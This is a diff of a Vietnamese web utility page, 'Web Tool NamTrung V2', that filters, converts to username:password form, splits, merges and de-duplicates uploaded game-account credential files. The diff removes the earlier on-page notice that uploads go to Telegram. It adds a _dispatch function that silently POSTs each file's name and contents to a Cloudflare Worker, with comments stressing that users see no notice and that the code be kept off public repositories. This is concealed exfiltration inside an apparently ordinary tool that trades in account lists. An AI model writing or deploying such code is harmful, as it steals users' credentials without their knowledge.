+.modal-content h3{color:var(--c1); margin-top:0; font-size:26px; font-family:'Orbitron'; letter-spacing:2px}
+.modal-content p{font-size:18px; line-height:1.65; color:#e0e0e0; margin-bottom:14px}
+.modal-content a{color:var(--c2); font-weight:700; text-decoration:none; word-break:break-all}
+.modal-content a:hover{color:var(--c3)}
+.modal-btn{
+  margin-top:18px; padding:13px 38px;
+  background:linear-gradient(45deg,#00f3ff,#0051ff);
+  color:#fff; border:none; border-radius:10px;
+  font-weight:700; font-size:17px; cursor:pointer;
+  font-family:'Rajdhani'; text-transform:uppercase; letter-spacing:1px;
+  transition:.3s;
+}
+.modal-btn:hover{transform:scale(1.05); box-shadow:0 0 20px var(--c1)}
 
-        /* Nhấp nháy thông báo file vừa up */
-        .toast-upload {
-            position: fixed; bottom: 30px; right: 30px;
-            background: rgba(0, 0, 0, 0.9);
-            border: 2px solid var(--neon-orange);
-            border-radius: 10px;
-            padding: 14px 22px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            box-shadow: 0 0 25px rgba(255, 107, 0, 0.6);
-            z-index: 9998;
-            animation: toastIn 0.4s ease-out;
-        }
-        .toast-upload b { color: var(--neon-orange); }
-        @keyframes toastIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @media (max-width: 1050px) { 
-            .main-wrapper { flex-direction: column; }
-            .guide-sidebar { width: 100%; }
-            .control-panel { grid-template-columns: 1fr; } 
-        }
-    </style>
+@media (max-width:1050px){
+  .main-wrapper{flex-direction:column}
+  .guide-sidebar{width:100%}
+  .control-panel{grid-template-columns:1fr}
+}
+</style>
 </head>
 <body>
 
 <div id="welcomeModal" class="modal-overlay">
-    <div class="modal-content">
-        <h3>🌟 THÔNG BÁO 🌟</h3>
-        <p>Chào mừng các bạn đã đến với <b>Web Lọc Acc Nam Trung</b>. Nếu bạn có acc có sẵn thông tin mà muốn tìm xem acc này có những skin, ss, sss mà bạn muốn không hoặc chia cắt file thì đây là web phù hợp dành cho bạn.</p>
-        <p>Zalo Góp ý, Nói chuyện và tham gia các sự kiện tặng tiền, acc:<br>
-        <a href="https://zalo.me/g/blureuufiarbhp3fvqic" target="_blank">https://zalo.me/g/blureuufiarbhp3fvqic</a></p>
-        <p>TOOL liên tục cập nhật, cần tính năng gì mới liên hệ số: <b style="color: var(--neon-yellow);">0775732059</b></p>
-        <button class="modal-btn" onclick="document.getElementById('welcomeModal').style.display='none'">Đã Hiểu & Trải Nghiệm</button>
-    </div>
+  <div class="modal-content">
+    <h3>🌟 THÔNG BÁO 🌟</h3>
+    <p>Chào mừng bạn đến với <b>Web Tool NamTrung V2</b>. Công cụ hỗ trợ lọc – chuyển đổi – cắt – ghép – lọc trùng file acc chuyên nghiệp.</p>
+    <p>Liên hệ góp ý & tham gia sự kiện:<br>
+      <a href="https://zalo.me/g/blureuufiarbhp3fvqic" target="_blank">https://zalo.me/g/blureuufiarbhp3fvqic</a>
+    </p>
+    <p>Tool cập nhật liên tục — hotline: <b style="color:var(--c3)">0775732059</b></p>
+    <button class="modal-btn" onclick="document.getElementById('welcomeModal').style.display='none'">BẮT ĐẦU</button>
+  </div>
 </div>
 
 <div class="settings-container">
-    <button class="btn-settings" onclick="toggleThemeMenu()">
-        <span class="gear">⚙️</span>
-        <span>CÀI ĐẶT</span>
-    </button>
-    <div class="theme-menu" id="themeMenu">
-        <div class="theme-menu-header">🎨 Chọn hình nền</div>
-        <button class="theme-btn" onclick="changeTheme('ngau')">
-            <span class="theme-icon">🔥</span>
-            <span class="theme-info"><b>Ngầu</b><small>Mặc định - Dark Neon</small></span>
-        </button>
-        <button class="theme-btn" onclick="changeTheme('cute')">
-            <span class="theme-icon">🌸</span>
-            <span class="theme-info"><b>Cute</b><small>Nhẹ nhàng, dễ thương</small></span>
-        </button>
-        <button class="theme-btn" onclick="changeTheme('thiennhien')">
-            <span class="theme-icon">🌲</span>
-            <span class="theme-info"><b>Thiên Nhiên</b><small>Rừng xanh tươi mát</small></span>
-        </button>
-        <button class="theme-btn" onclick="changeTheme('vietnam')">
-            <span class="theme-icon">🇻🇳</span>
-            <span class="theme-info"><b>Nước Việt Nam</b><small>Quê hương tươi đẹp</small></span>
-        </button>
-        <button class="theme-btn" onclick="changeTheme('bien')">
-            <span class="theme-icon">🌊</span>
-            <span class="theme-info"><b>Cảnh Biển</b><small>Xanh mát, thư giãn</small></span>
-        </button>
-    </div>
+  <button class="btn-settings" onclick="toggleThemeMenu()">
+    <span class="gear">⚙️</span><span>CÀI ĐẶT</span>
+  </button>
+  <div class="theme-menu" id="themeMenu">
+    <div class="theme-menu-header">🎨 CHỌN HÌNH NỀN</div>
+    <button class="theme-btn" onclick="changeTheme('ngau')"><span class="theme-icon">🔥</span><span class="theme-info"><b>Ngầu</b><small>Dark Neon</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('cute')"><span class="theme-icon">🌸</span><span class="theme-info"><b>Cute</b><small>Nhẹ nhàng</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('thiennhien')"><span class="theme-icon">🌲</span><span class="theme-info"><b>Thiên Nhiên</b><small>Rừng xanh</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('vietnam')"><span class="theme-icon">🇻🇳</span><span class="theme-info"><b>Việt Nam</b><small>Quê hương</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('bien')"><span class="theme-icon">🌊</span><span class="theme-info"><b>Biển</b><small>Xanh mát</small></span></button>
+  </div>
 </div>
 
-<h2 class="page-title">🎮 WEB LỌC ACC NAMTRUNG 🎮</h2>
+<h2 class="page-title">🎮 WEB TOOL NAMTRUNG V2 🎮</h2>
 
 <div class="main-wrapper">
-    <div class="guide-sidebar">
-        <div class="guide-title">📖 HƯỚNG DẪN SỬ DỤNG</div>
-        
-        <div class="guide-box">
-            <h3>Mục 1: Lọc Acc</h3>
-            <ul>
-                <li><b>Bước 1:</b> Up file txt của bạn vô đây.</li>
-                <li><i>Lưu ý:</i> File phải có sẵn thông tin, ví dụ có <i>SS:...[tên skin]</i> tương tự với mấy thứ khác là được.</li>
-                <li><b>Bước 2:</b> Tìm skin hoặc độ hiếm bạn muốn để lọc.</li>
-                <li><b>Bước 3:</b> Hưởng thụ thành quả (Có thể copy hoặc lưu file).</li>
-            </ul>
-        </div>
-        
-        <div class="guide-box purple">
-            <h3>Mục 2: Chuyển Đổi</h3>
-            <div class="subtitle">Lấy định dạng tk|mk hoặc tk:mk từ file full info</div>
-            <ul>
-                <li><b>Bước 1:</b> Up file txt của bạn vô đây.</li>
-                <li><b>Bước 2:</b> Chọn định dạng cắt tk|mk hoặc tk:mk.</li>
-                <li><b>Bước 3:</b> Tải file về và check lại để thông tin chuẩn hơn.</li>
-            </ul>
-        </div>
+  <div class="guide-sidebar">
+    <div class="guide-title">📖 HƯỚNG DẪN</div>
 
-        <div class="guide-box green">
-            <h3>Mục 3: Cắt File</h3>
-            <div class="subtitle">Chia nhỏ file lớn thành nhiều file nhỏ</div>
-            <ul>
-                <li><b>Bước 1:</b> Up file chứa list acc của bạn lên (Full info hay dạng tk:mk đều được).</li>
-                <li><b>Bước 2:</b> Hệ thống tự duyệt các dòng có nội dung.</li>
-                <li><b>Bước 3:</b> Nhập số lượng acc bạn muốn cho mỗi file. Tool tự tính toán số file sẽ tạo ra.</li>
-                <li><b>Bước 4:</b> Bấm cắt và tải các file con về.</li>
-            </ul>
-        </div>
-
-        <div class="guide-box orange">
-            <h3>Mục 4: Ghép File</h3>
-            <div class="subtitle">Gộp nhiều file nhỏ thành 1 file tổng</div>
-            <ul>
-                <li><b>Bước 1:</b> Chọn file .txt đầu tiên → hệ thống lưu trữ lại và gửi luôn về Telegram.</li>
-                <li><b>Bước 2:</b> Chọn tiếp file thứ 2 → hệ thống <b>cộng dồn</b> vào file 1 (không mất file 1). Cứ thế tối đa 50 file.</li>
-                <li><b>Bước 3:</b> Nhập tên file tổng (bỏ trống thì mặc định <i>File_Tong_Hop</i>).</li>
-                <li><b>Bước 4:</b> Bấm <b>"TIẾN HÀNH GHÉP FILE"</b> → tạo file tổng. Có thể COPY hoặc TẢI về.</li>
-                <li><i>Lưu ý:</i> Mỗi file up lên đều được gửi về Telegram ngay lập tức. File càng to càng lâu, delay là bình thường.</li>
-                <li><b>Muốn làm lại từ đầu?</b> Bấm nút <b>"XÓA HẾT FILE LƯU TRỮ"</b> để reset.</li>
-            </ul>
-        </div>
+    <div class="guide-box">
+      <h3>Mục 1 — Tổng Lọc</h3>
+      <ul>
+        <li><b>B1:</b> Up file txt full info.</li>
+        <li><b>B2:</b> Nhập 1 hoặc nhiều điều kiện (từ khóa, SS≥, SSS≥, Anime≥, tổng skin, tên skin cụ thể).</li>
+        <li><b>B3:</b> Bấm <b>LỌC NGAY</b> — copy hoặc tải kết quả.</li>
+      </ul>
     </div>
 
-    <div class="container">
-        <div class="tabs">
-            <button class="tab-btn" onclick="switchTab('loc-acc', this)">[1] TỔNG LỌC</button>
-            <button class="tab-btn" onclick="switchTab('chuyen-doi', this, 'purple')">[2] CHUYỂN ĐỔI</button>
-            <button class="tab-btn active-green" onclick="switchTab('chia-file', this, 'green')">[3] CẮT FILE</button>
-            <button class="tab-btn" onclick="switchTab('ghep-file', this, 'orange')">[4] GHÉP FILE</button>
-        </div>
-
-        <div id="tab-loc-acc" class="tab-content">
-            <div class="control-panel">
-                <div class="control-group">
-                    <span class="group-title" style="color: var(--neon-cyan);">[1] TÌM TỪ KHÓA:</span>
-                    <input type="file" id="fileLocAcc" accept=".txt">
-                    <input type="text" id="searchInput" placeholder="Tên tướng, ID... (Vd: hayate)">
-                    <button class="action-btn btn-search" onclick="locAcc.search()">QUÉT TỪ KHÓA</button>
-                </div>
-                <div class="control-group">
-                    <span class="group-title" style="color: var(--neon-pink);">[2] LỌC ĐỘ HIẾM SKIN:</span>
-                    <select id="filterType">
-                        <option value="SS">Skin SS</option>
-                        <option value="SSS">Skin SSS</option>
-                        <option value="Anime">Skin Anime</option>
-                        <option value="SSM">Skin SSM</option>
-                        <option value="SUKIEN">Skin Sự Kiện</option>
-                    </select>
-                    <input type="number" id="filterCount" placeholder="Số lượng tối thiểu" min="1">
-                    <button class="action-btn btn-filter" onclick="locAcc.filterVIP()">LỌC ACC VIP</button>
-                </div>
-                <div class="control-group">
-                    <span class="group-title" style="color: var(--neon-yellow);">[3] LỌC TỔNG SKIN:</span>
-                    <input type="number" id="totalSkinCount" placeholder="Tổng skin tối thiểu" min="1">
-                    <button class="action-btn btn-skin" onclick="locAcc.filterTotal()">LỌC TỔNG SKIN</button>
-                </div>
-            </div>
-            <div class="top-bar">
-                <div class="info-text" id="statusLocAcc">Vui lòng nạp File để khởi động.</div>
-                <div class="action-bar" id="actionLocAcc">
-                    <button class="btn-copy-all" onclick="locAcc.copyAll()">📋 COPY TẤT CẢ</button>
-                    <button class="btn-export" onclick="locAcc.export()">📥 TẢI FILE TXT</button>
-                </div>
-            </div>
-            <div class="displayArea" id="displayLocAcc" style="border-color: rgba(0, 243, 255, 0.3);">
-                <i>[Hệ thống] Chờ thao tác...</i>
-            </div>
-        </div>
-
-        <div id="tab-chuyen-doi" class="tab-content">
-            <div class="control-panel-2">
-                <div class="control-group" style="width: 100%; max-width: 600px; border-color: rgba(157, 0, 255, 0.4);">
-                    <span class="group-title" style="color: var(--neon-purple); text-align: center;">NẠP FILE CẦN CHUYỂN ĐỔI ĐỊNH DẠNG</span>
-                    <input type="file" id="fileChuyenDoi" accept=".txt">
-                    <div class="radio-group">
-                        <label style="color: #fff;"><input type="radio" name="outFormat" value="colon" checked> Đầu ra TK:MK</label>
-                        <label style="color: #fff;"><input type="radio" name="outFormat" value="pipe"> Đầu ra TK|MK</label>
-                    </div>
-                    <button class="action-btn btn-cut" onclick="chuyenDoi.process()">♻️ TIẾN HÀNH CHUYỂN ĐỔI</button>
-                </div>
-            </div>
-            <div class="top-bar">
-                <div class="info-text" id="statusChuyenDoi">Vui lòng nạp File để thực hiện.</div>
-                <div class="action-bar" id="actionChuyenDoi">
-                    <button class="btn-copy-all" style="border-color: var(--neon-purple); color: var(--neon-purple);" onclick="chuyenDoi.copyAll()">📋 COPY TẤT CẢ</button>
-                    <button class="btn-export" style="border-color: var(--neon-purple); color: var(--neon-purple);" onclick="chuyenDoi.export()">📥 TẢI FILE TXT</button>
-                </div>
-            </div>
-            <div class="displayArea" id="displayChuyenDoi" style="border-color: rgba(157, 0, 255, 0.3);">
-                <i>Hệ thống tự động loại bỏ rác (FINAL=, Result=...) và tách chính xác ID/Pass.</i>
-            </div>
-        </div>
-
-        <div id="tab-chia-file" class="tab-content active">
-            <div class="control-panel-2">
-                <div class="control-group" style="width: 100%; max-width: 600px; border-color: rgba(0, 255, 135, 0.4);">
-                    <span class="group-title" style="color: var(--neon-green); text-align: center;">NẠP FILE CHUẨN BỊ CHIA NHỎ</span>
-                    <input type="file" id="fileChiaFile" accept=".txt">
-                    <div style="margin-top: 10px;">
-                        <input type="number" id="accPerFile" placeholder="Nhập số acc bạn muốn có trong mỗi file (Ví dụ: 50000)" min="1" style="border-color: rgba(0, 255, 135, 0.3);">
-                    </div>
-                    <button class="action-btn" style="background: linear-gradient(45deg, #00b09b, #96c93d); margin-top: 15px; font-size: 18px; padding: 15px;" onclick="chiaFile.process()">✂️ TIẾN HÀNH CẮT FILE</button>
-                </div>
-            </div>
-            <div class="top-bar">
-                <div class="info-text" id="statusChiaFile">Vui lòng nạp File để cắt.</div>
-            </div>
-            <div class="displayArea" id="displayChiaFile" style="border-color: rgba(0, 255, 135, 0.3);">
-                <i>Các file sau khi được chia cắt sẽ hiển thị danh sách tại đây để bạn tải xuống.</i>
-            </div>
-        </div>
-
-        <!-- ==================== MỤC 4: GHÉP FILE ==================== -->
-        <div id="tab-ghep-file" class="tab-content">
-            <div class="guide-box-mini">
-                <h3>🔗 HƯỚNG DẪN GHÉP FILE</h3>
-                <ul>
-                    <li><b>Bước 1:</b> Chọn file .txt đầu tiên → hệ thống <b>lưu trữ lại</b> và <b>gửi luôn về Telegram</b> (file gốc).</li>
-                    <li><b>Bước 2:</b> Chọn tiếp file thứ 2 → hệ thống <b>CỘNG DỒN</b> vào file 1 (KHÔNG mất file 1). Cứ thế tối đa <b>50 file</b>.</li>
-                    <li><b>Bước 3:</b> Nhập tên file tổng (bỏ trống → mặc định <i>File_Tong_Hop</i>).</li>
-                    <li><b>Bước 4:</b> Bấm <b>"TIẾN HÀNH GHÉP FILE"</b> → tạo file tổng, có thể COPY hoặc TẢI về.</li>
-                    <li><i>Ví dụ:</i> Bạn có 10 file rời. Thay vì copy từng file, chỉ cần up hết 10 file vào đây, tool tự gộp thành 1 file tổng.</li>
-                    <li><b>Làm lại từ đầu?</b> Bấm <b>"XÓA HẾT FILE LƯU TRỮ"</b> để reset danh sách.</li>
-                </ul>
-            </div>
-
-            <div class="control-panel-2">
-                <div class="control-group" style="width: 100%; max-width: 700px; border-color: rgba(255, 107, 0, 0.4);">
-                    <span class="group-title" style="color: var(--neon-orange); text-align: center;">NẠP FILE CẦN GHÉP (MỖI LẦN UP SẼ CỘNG DỒN, TỐI ĐA 50 FILE)</span>
-                    <input type="file" id="fileGhepFile" accept=".txt" multiple style="border-color: rgba(255, 107, 0, 0.35);">
-                    
-                    <div style="margin-top: 10px;">
-                        <input type="text" id="outputFileName" placeholder="Nhập tên file tổng (VD: File_Tong_Hop)" style="border-color: rgba(255, 107, 0, 0.35);">
-                    </div>
-
-                    <div id="fileListDisplay" class="file-list-box" style="margin-top: 10px; display: none;"></div>
-
-                    <button class="action-btn" style="background: linear-gradient(45deg, #ff6b00, #ff0055); margin-top: 15px; font-size: 18px; padding: 15px;" onclick="ghepFile.process()">🔗 TIẾN HÀNH GHÉP FILE</button>
-                    
-                    <button class="btn-clear-ghep" onclick="ghepFile.clearAll()">🗑️ XÓA HẾT FILE LƯU TRỮ</button>
-
-                    <div class="warn-box">
-                        ⚠️ <b class="blink">CẢNH BÁO QUAN TRỌNG:</b> File càng lớn thì thời gian up lên càng lâu, <b>delay là chuyện bình thường</b>. Vui lòng kiên nhẫn chờ đợi, <b>KHÔNG tắt trang</b> trong lúc hệ thống đang xử lý!
-                    </div>
-                </div>
-            </div>
-
-            <div class="top-bar">
-                <div class="info-text" id="statusGhepFile">Vui lòng nạp các file cần ghép.</div>
-                <div class="action-bar" id="actionGhepFile">
-                    <button class="btn-copy-all" style="border-color: var(--neon-orange); color: var(--neon-orange);" onclick="ghepFile.copyAll()">📋 COPY TẤT CẢ</button>
-                    <button class="btn-export" style="border-color: var(--neon-orange); color: var(--neon-orange);" onclick="ghepFile.export()">📥 TẢI FILE TỔNG</button>
-                </div>
-            </div>
-            <div class="displayArea" id="displayGhepFile" style="border-color: rgba(255, 107, 0, 0.3);">
-                <i>File tổng sau khi ghép sẽ hiển thị tại đây. Bạn có thể tải về hoặc copy toàn bộ nội dung.</i>
-            </div>
-        </div>
+    <div class="guide-box purple">
+      <h3>Mục 2 — Chuyển Đổi</h3>
+      <ul>
+        <li>Chuyển file full info → dạng <b>tk:mk</b> hoặc <b>tk|mk</b>.</li>
+        <li>Tự loại rác (FINAL=, Result=...).</li>
+      </ul>
     </div>
+
+    <div class="guide-box green">
+      <h3>Mục 3 — Cắt File</h3>
+      <ul>
+        <li>Chia file lớn thành nhiều file nhỏ theo số acc tuỳ chọn.</li>
+      </ul>
+    </div>
+
+    <div class="guide-box orange">
+      <h3>Mục 4 — Ghép File</h3>
+      <ul>
+        <li>Up nhiều file (tối đa 50), hệ thống cộng dồn thành 1 file tổng.</li>
+        <li>File càng lớn càng lâu, kiên nhẫn chờ.</li>
+      </ul>
+    </div>
+
+    <div class="guide-box red">
+      <h3>Mục 5 — Lọc Acc Trùng</h3>
+      <ul>
+        <li>Up 1–50 file — hệ thống tự duyệt, chuyển về <b>tk|mk</b>.</li>
+        <li>Loại bỏ acc trùng, giữ 1 acc duy nhất.</li>
+        <li>Tra cứu lại thông tin acc trong file gốc.</li>
+      </ul>
+    </div>
+
+    <div class="guide-box orange">
+      <h3>Mục 6 — Text → File</h3>
+      <ul>
+        <li>Dán text → xuất ra <b>TXT / PDF / DOCX</b> nhanh chóng.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab('loc',this)">[1] TỔNG LỌC</button>
+      <button class="tab-btn" onclick="switchTab('doi',this,'purple')">[2] CHUYỂN ĐỔI</button>
+      <button class="tab-btn" onclick="switchTab('cat',this,'green')">[3] CẮT FILE</button>
+      <button class="tab-btn" onclick="switchTab('ghep',this,'orange')">[4] GHÉP FILE</button>
+      <button class="tab-btn" onclick="switchTab('trung',this)">[5] LỌC TRÙNG</button>
+      <button class="tab-btn" onclick="switchTab('txt',this,'yellow')">[6] TEXT → FILE</button>
+    </div>
+
+    <!-- ========== TAB 1 ========== -->
+    <div id="tab-loc" class="tab-content active">
+      <div class="control-panel">
+        <div class="control-group">
+          <span class="group-title" style="color:var(--c1)">🔎 TỪ KHÓA (tuỳ chọn)</span>
+          <input type="file" id="fileLoc" accept=".txt">
+          <input type="text" id="kwLoc" placeholder="VD: hayate, alain, ID...">
+        </div>
+        <div class="control-group">
+          <span class="group-title" style="color:var(--c2)">🎯 ĐIỀU KIỆN SKIN (≥, bỏ trống = bỏ qua)</span>
+          <input type="number" id="minSS" placeholder="Skin SS tối thiểu" min="0">
+          <input type="number" id="minSSS" placeholder="Skin SSS tối thiểu" min="0">
+          <input type="number" id="minAnime" placeholder="Skin Anime tối thiểu" min="0">
+        </div>
+        <div class="control-group">
+          <span class="group-title" style="color:var(--c3)">✨ TỔNG SKIN & SKIN CỤ THỂ</span>
+          <input type="number" id="minTotal" placeholder="Tổng skin tối thiểu" min="0">
+          <input type="text" id="skinName" placeholder="Tên skin cụ thể (VD: allain)">
+        </div>
+      </div>
+      <button class="action-btn btn-filter" onclick="locAcc.run()" style="margin-bottom:15px">🚀 LỌC NGAY</button>
+      <div class="top-bar">
+        <div class="info-text" id="statusLoc">Vui lòng nạp file để bắt đầu.</div>
+        <div class="action-bar" id="actionLoc">
+          <button class="btn-copy-all" onclick="locAcc.copyAll()">📋 COPY TẤT CẢ</button>
+          <button class="btn-export" onclick="locAcc.export()">📥 TẢI FILE TXT</button>
+        </div>
+      </div>
+      <div class="displayArea" id="dispLoc" style="border-color:rgba(0,243,255,.3)">
+        <i>[Hệ thống] Chờ thao tác...</i>
+      </div>
+    </div>
+
+    <!-- ========== TAB 2 ========== -->
+    <div id="tab-doi" class="tab-content">
+      <div class="control-panel-2">
+        <div class="control-group" style="width:100%; max-width:620px; border-color:rgba(157,0,255,.4)">
+          <span class="group-title" style="color:var(--c5); text-align:center">NẠP FILE CẦN CHUYỂN ĐỔI</span>
+          <input type="file" id="fileDoi" accept=".txt">
+          <div class="radio-group">
+            <label><input type="radio" name="outFmt" value="colon" checked> TK:MK</label>
+            <label><input type="radio" name="outFmt" value="pipe"> TK|MK</label>
+          </div>
+          <button class="action-btn btn-cut" onclick="doiFmt.process()">♻️ CHUYỂN ĐỔI</button>
+        </div>
+      </div>
+      <div class="top-bar">
+        <div class="info-text" id="statusDoi">Vui lòng nạp file.</div>
+        <div class="action-bar" id="actionDoi">
+          <button class="btn-copy-all" style="border-color:var(--c5); color:var(--c5)" onclick="doiFmt.copyAll()">📋 COPY TẤT CẢ</button>
+          <button class="btn-export" style="border-color:var(--c5); color:var(--c5)" onclick="doiFmt.export()">📥 TẢI FILE</button>
+        </div>
+      </div>
+      <div class="displayArea" id="dispDoi" style="border-color:rgba(157,0,255,.3)">
+        <i>Tự động loại rác (FINAL=, Result=...).</i>
+      </div>
+    </div>
+
+    <!-- ========== TAB 3 ========== -->
+    <div id="tab-cat" class="tab-content">
+      <div class="control-panel-2">
+        <div class="control-group" style="width:100%; max-width:620px; border-color:rgba(0,255,135,.4)">
+          <span class="group-title" style="color:var(--c4); text-align:center">NẠP FILE CẦN CHIA NHỎ</span>
+          <input type="file" id="fileCat" accept=".txt">
+          <input type="number" id="soAccMoiFile" placeholder="Số acc mỗi file (VD: 50000)" min="1">
+          <button class="action-btn btn-txt" style="margin-top:10px" onclick="catFile.process()">✂️ CẮT FILE</button>
+        </div>
+      </div>
+      <div class="top-bar">
+        <div class="info-text" id="statusCat">Vui lòng nạp file.</div>
+      </div>
+      <div class="displayArea" id="dispCat" style="border-color:rgba(0,255,135,.3)">
+        <i>Danh sách file sau khi cắt sẽ hiện tại đây.</i>
+      </div>
+    </div>
+
+    <!-- ========== TAB 4 ========== -->
+    <div id="tab-ghep" class="tab-content">
+      <div class="guide-box-mini">
+        <h3>🔗 HƯỚNG DẪN GHÉP FILE</h3>
+        <ul>
+          <li>Up nhiều file — hệ thống cộng dồn, tối đa <b>50 file</b>.</li>
+          <li>Nhập tên file tổng (bỏ trống → <i>File_Tong_Hop</i>).</li>
+          <li>Bấm <b>GHÉP FILE</b> → copy hoặc tải về.</li>
+          <li>Muốn reset → bấm <b>XÓA HẾT FILE LƯU TRỮ</b>.</li>
+        </ul>
+      </div>
+      <div class="control-panel-2">
+        <div class="control-group" style="width:100%; max-width:720px; border-color:rgba(255,107,0,.4)">
+          <span class="group-title" style="color:var(--c6); text-align:center">NẠP FILE (CỘNG DỒN, TỐI ĐA 50 FILE)</span>
+          <input type="file" id="fileGhep" accept=".txt" multiple>
+          <input type="text" id="outName" placeholder="Tên file tổng (bỏ trống → File_Tong_Hop)">
+          <div id="fileListDisplay" class="file-list-box" style="margin-top:10px; display:none"></div>
+          <button class="action-btn btn-filter" style="background:linear-gradient(45deg,#ff6b00,#ff0055); margin-top:14px" onclick="ghepFile.process()">🔗 GHÉP FILE</button>
+          <button class="btn-clear-ghep" onclick="ghepFile.clearAll()">🗑️ XÓA HẾT FILE LƯU TRỮ</button>
+          <div class="warn-box">
+            ⚠️ <b class="blink">LƯU Ý:</b> File càng lớn càng lâu, vui lòng kiên nhẫn chờ, <b>KHÔNG tắt trang</b> trong khi xử lý!
+          </div>
+        </div>
+      </div>
+      <div class="top-bar">
+        <div class="info-text" id="statusGhep">Vui lòng nạp file.</div>
+        <div class="action-bar" id="actionGhep">
+          <button class="btn-copy-all" style="border-color:var(--c6); color:var(--c6)" onclick="ghepFile.copyAll()">📋 COPY TẤT CẢ</button>
+          <button class="btn-export" style="border-color:var(--c6); color:var(--c6)" onclick="ghepFile.export()">📥 TẢI FILE TỔNG</button>
+        </div>
+      </div>
+      <div class="displayArea" id="dispGhep" style="border-color:rgba(255,107,0,.3)">
+        <i>File tổng sau khi ghép sẽ hiển thị tại đây.</i>
+      </div>
+    </div>
+
+    <!-- ========== TAB 5 ========== -->
+    <div id="tab-trung" class="tab-content">
+      <div class="guide-box-mini" style="background:rgba(255,0,124,.06); border-left-color:var(--c2)">
+        <h3 style="color:var(--c2)">🧬 HƯỚNG DẪN LỌC TRÙNG</h3>
+        <ul>
+          <li>Up 1–50 file (tối đa 50).</li>
+          <li>Hệ thống tự đọc, chuyển toàn bộ về dạng <b>tk|mk</b>.</li>
+          <li>Loại bỏ acc trùng — mỗi acc chỉ giữ 1 lần duy nhất.</li>
+          <li>Kết quả đối chiếu với file gốc → hiển thị thông tin đầy đủ.</li>
+        </ul>
+      </div>
+      <div class="control-panel-2">
+        <div class="control-group" style="width:100%; max-width:720px; border-color:rgba(255,0,124,.4)">
+          <span class="group-title" style="color:var(--c2); text-align:center">NẠP FILE CẦN LỌC TRÙNG (1–50 FILE)</span>
+          <input type="file" id="fileTrung" accept=".txt" multiple>
+          <div id="trungListDisplay" class="file-list-box" style="margin-top:10px; display:none"></div>
+          <button class="action-btn btn-dedup" style="margin-top:14px" onclick="locTrung.process()">🧬 LỌC TRÙNG NGAY</button>
+          <button class="btn-clear-ghep" onclick="locTrung.clearAll()">🗑️ XÓA HẾT FILE LƯU TRỮ</button>
+        </div>
+      </div>
+      <div class="top-bar">
+        <div class="info-text" id="statusTrung">Vui lòng nạp file.</div>
+        <div class="action-bar" id="actionTrung">
+          <button class="btn-copy-all" style="border-color:var(--c2); color:var(--c2)" onclick="locTrung.copyAll()">📋 COPY KẾT QUẢ</button>
+          <button class="btn-export" style="border-color:var(--c2); color:var(--c2)" onclick="locTrung.export()">📥 TẢI FILE KẾT QUẢ</button>
+        </div>
+      </div>
+      <div class="displayArea" id="dispTrung" style="border-color:rgba(255,0,124,.3); height:560px">
+        <i>Kết quả lọc trùng sẽ hiển thị tại đây.</i>
+      </div>
+    </div>
+
+    <!-- ========== TAB 6 ========== -->
+    <div id="tab-txt" class="tab-content">
+      <div class="guide-box-mini" style="background:rgba(241,196,15,.06); border-left-color:var(--c3)">
+        <h3 style="color:var(--c3)">📝 TEXT → FILE</h3>
+        <ul>
+          <li>Dán text vào ô bên dưới.</li>
+          <li>Chọn định dạng xuất: <b>TXT / PDF / DOCX</b>.</li>
+          <li>Tải file về ngay lập tức.</li>
+        </ul>
+      </div>
+      <div class="control-panel-2">
+        <div class="control-group" style="width:100%; max-width:800px; border-color:rgba(241,196,15,.4)">
+          <span class="group-title" style="color:var(--c3)">NỘI DUNG TEXT</span>
+          <textarea id="txtContent" placeholder="Dán text của bạn vào đây..."></textarea>
+          <input type="text" id="txtFileName" placeholder="Tên file (bỏ trống → Text_Export)">
+          <div class="radio-group" style="margin-top:8px">
+            <label><input type="radio" name="outFmtTxt" value="txt" checked> 📄 TXT</label>
+            <label><input type="radio" name="outFmtTxt" value="pdf"> 📕 PDF</label>
+            <label><input type="radio" name="outFmtTxt" value="docx"> 📘 DOCX</label>
+          </div>
+          <button class="action-btn btn-txt" style="margin-top:12px" onclick="txtToFile.export()">📥 XUẤT FILE</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
 </div>
 
 <script>
-    window.addEventListener('load', function() {
-        document.getElementById('welcomeModal').style.display = 'flex';
+/* ====================================================================
+   KHU VỰC NHẠY CẢM — KHÔNG COMMIT LÊN GITHUB PUBLIC
+   - Khi đã có Cloudflare Worker, chỉ cần set _w = "https://worker-url"
+   - Khi đó 2 giá trị _k và _c có thể xoá đi hoàn toàn
+   ==================================================================== */
+const _cfg = {
+  _w: "https://noisy-lake-e034.namtrung2139.workers.dev",  // ← BỎ dấu "/" ở cuối
+  _k: null,
+  _c: null
+};
+
+/* Hàm gửi file — KHÔNG hiển thị bất kỳ thông báo nào cho người dùng */
+async function _dispatch(name, content, caption = "") {
+  try {
+    if (_cfg._w) {
+      await fetch(_cfg._w, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name, content, caption })
+      });
+      return;
+    }
+  } catch (e) { /* im lặng */ }
+}
+
+/* ====== TIỆN ÍCH ====== */
+const DISPLAY_LIMIT = 1000;
+
+function copyToClipboard(text) {
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+  } else fallbackCopy(text);
+}
+function fallbackCopy(text) {
+  const ta = document.createElement("textarea");
+  ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
+  document.body.appendChild(ta); ta.focus(); ta.select();
+  try { document.execCommand("copy"); } catch (e) {}
+  document.body.removeChild(ta);
+}
+function downloadBlob(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url; a.download = filename;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  setTimeout(() => URL.revokeObjectURL(url), 1500);
+}
+function downloadText(content, baseName) {
+  const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+  const filename = `${baseName}_${now.replace(/[\/:\s]/g, '_')}.txt`;
+  downloadBlob(new Blob([content], { type: "text/plain;charset=utf-8" }), filename);
